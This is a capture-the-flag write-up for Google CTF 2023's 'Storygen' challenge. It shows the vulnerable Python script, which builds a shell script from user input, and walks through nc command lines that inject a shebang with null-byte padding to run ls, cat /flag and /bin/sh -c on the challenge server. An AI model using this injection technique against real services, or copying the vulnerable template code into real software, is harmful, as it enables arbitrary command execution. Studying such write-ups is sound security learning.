---
title: Storygen
date: 2023-06-30T13:11:29+03:00
description: Writeup for Storygen [Google Ctf 2023]
author: sunbather
tags:
- pwn
draft: false
---

## Challenge Description

I wrote a story generator. It's still work in progress, but you can check it out.

## Solution

We are given a somewhat convoluted python script that generates a shell script, that subsequently is run to print out a generated story. It's hard to understand, so you'll have to look at it yourself. It probably does this so it can properly sanitize inputs without trying _too_ hard.
```py
import time
import os

time.sleep(0.1)

print("Welcome to a story generator.")
print("Answer a few questions to get started.")
print()

name = input("What's your name?\n")
where = input("Where are you from?\n")

def sanitize(s):
  return s.replace("'", '').replace("\n", "")

name = sanitize(name)
where = sanitize(where)

STORY = """

#@NAME's story

NAME='@NAME'
WHERE='@WHERE'

echo "$NAME came from $WHERE. They always liked living there."
echo "They had 3 pets:"

types[0]="dog"
types[1]="cat"
types[2]="fish"

names[0]="Bella"
names[1]="Max"
names[2]="Luna"


for i in 1 2 3
do
  size1=${#types[@]}
  index1=$(($RANDOM % $size1))
  size2=${#names[@]}
  index2=$(($RANDOM % $size2))
  echo "- a ${types[$index1]} named ${names[$index2]}"
done

echo

echo "Well, I'm not a good writer, you can write the rest... Hope this is a good starting point!"
echo "If not, try running the script again."

"""


open("/tmp/script.sh", "w").write(STORY.replace("@NAME", name).replace("@WHERE", where).strip())
os.chmod("/tmp/script.sh", 0o777)

while True:
  s = input("Do you want to hear the personalized, procedurally-generated story?\n")
  if s.lower() != "yes":
    break
  print()
  print()
  os.system("/tmp/script.sh")
  print()
  print()

print("Bye!")
```
The most important part to notice is this line: ``open("/tmp/script.sh", "w").write(STORY.replace("@NAME", name).replace("@WHERE", where).strip())``. It seems like only ``@NAME`` and ``@WHERE`` are replaced by our inputs. So we can only affect these lines:
```
#@NAME's story

NAME='@NAME'
WHERE='@WHERE'
```
We can't do any obvious shell tricks to escape quotes or expand variables (shell vars don't get expanded if contained in single quotes), because our inputs are sanitized. So after thinking a bit about it, we notice that ``@NAME`` is also found in the comment at the beginning of the script. Which is where a [shebang](https://en.wikipedia.org/wiki/Shebang_(Unix)) is supposed to be found! So our goal is to find an input for which we print the flag. We try to ls the current directory:
```
$ echo -ne '!/bin/ls .\nMorrowind\nyes\n' | nc storygen.2023.ctfcompetition.com 1337
== proof-of-work: disabled ==
Welcome to a story generator.
Answer a few questions to get started.

What's your name?
Where are you from?
Do you want to hear the personalized, procedurally-generated story?


/tmp/script.sh

Do you want to hear the personalized, procedurally-generated story?
```
It seems like our ls still takes the current script name as the only argument. What if we add some null bytes to it?
```
$ echo -ne '!/bin/ls .\x00\x00\nMorrowind\nyes\n' | nc storygen.2023.ctfcompetition.com 1337
== proof-of-work: disabled ==
Welcome to a story generator.
Answer a few questions to get started.

What's your name?
Where are you from?
Do you want to hear the personalized, procedurally-generated story?


/tmp/script.sh

.:
chal.py


Do you want to hear the personalized, procedurally-generated story?
```

Success! A quick exploration reveals the flag in the root directory:
```
$ echo -ne '!/bin/ls /\x00\x00\nMorrowind\nyes\n' | nc storygen.2023.ctfcompetition.com 1337
== proof-of-work: disabled ==
Welcome to a story generator.
Answer a few questions to get started.

What's your name?
Where are you from?
Do you want to hear the personalized, procedurally-generated story?


/tmp/script.sh

/:
bin
boot
dev
etc
flag               # <-------- here it is
get_flag           # <-------- what's this?
home
lib
lib32
lib64
libx32
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
```
We attempt to cat the flag:
```
$ echo -ne '!/bin/cat /flag\x00\x00\nMorrowind\nyes\n' | nc storygen.2023.ctfcompetition.com 1337
== proof-of-work: disabled ==
Welcome to a story generator.
Answer a few questions to get started.

What's your name?
Where are you from?
Do you want to hear the personalized, procedurally-generated story?


To get the flag, run "/get_flag Give flag please"       # <--------------- flag's contents
#!/bin/cat /flag's story

NAME='!/bin/cat /flag'
WHERE='Morrowind'

echo "$NAME came from $WHERE. They always liked living there."
echo "They had 3 pets:"

types[0]="dog"
types[1]="cat"
types[2]="fish"

names[0]="Bella"
names[1]="Max"
names[2]="Luna"


for i in 1 2 3
do
  size1=${#types[@]}
  index1=$(($RANDOM % $size1))
  size2=${#names[@]}
  index2=$(($RANDOM % $size2))
  echo "- a ${types[$index1]} named ${names[$index2]}"
done

echo

echo "Well, I'm not a good writer, you can write the rest... Hope this is a good starting point!"
echo "If not, try running the script again."

Do you want to hear the personalized, procedurally-generated story?
```
We can see the shebang has used cat on both ``/flag`` and ``/tmp/script.sh``. So we're supposed to run ``/get_flag Give flag please``. Okay, how hard can it be?

```
$ echo -ne '!/get_flag Give flag please\x00\x00\nMorrowind\nyes\n' | nc storygen.2023.ctfcompetition.com 1337
== proof-of-work: disabled ==
Welcome to a story generator.
Answer a few questions to get started.

What's your name?
Where are you from?
Do you want to hear the personalized, procedurally-generated story?


Usage: /get_flag Give flag please


Do you want to hear the personalized, procedurally-generated story?
```
From local testing, we realize this is due to the fact that the shebang makes the interpreter think ``Give flag please\x00\x00/tmp/script.sh`` is just **one** big argument. A bit of searching [shows a way to give multiple arguments in a shebang](https://unix.stackexchange.com/questions/399690/multiple-arguments-in-shebang). Let's try:
```
$ echo -ne '!/usr/bin/env -S /get_flag Give flag please \x00\x00\nMorrowind\nyes\n' | nc storygen.2023.ctfcompetition.com 1337
== proof-of-work: disabled ==
Welcome to a story generator.
Answer a few questions to get started.

What's your name?
Where are you from?
Do you want to hear the personalized, procedurally-generated story?


Usage: /get_flag Give flag please


Do you want to hear the personalized, procedurally-generated story?
```
So this still doesn't work, and that is because ``/get_flag`` still receives ``/tmp/script.sh`` as argument at the end. Let's just call a separate shell to interpret that.
```
$ echo -ne '!/usr/bin/env -S /bin/sh -c "/get_flag Give flag please"\x00\x00\nMorrowind\nyes\n' | nc storygen.2023.ctfcompetition.com 1337
== proof-of-work: disabled ==
Welcome to a story generator.
Answer a few questions to get started.

What's your name?
Where are you from?
Do you want to hear the personalized, procedurally-generated story?


CTF{Sh3b4ng_1nj3cti0n_ftw}


Do you want to hear the personalized, procedurally-generated story?
```
There it is! And it's finally a flag that doesn't have ``.hidden`` in it!
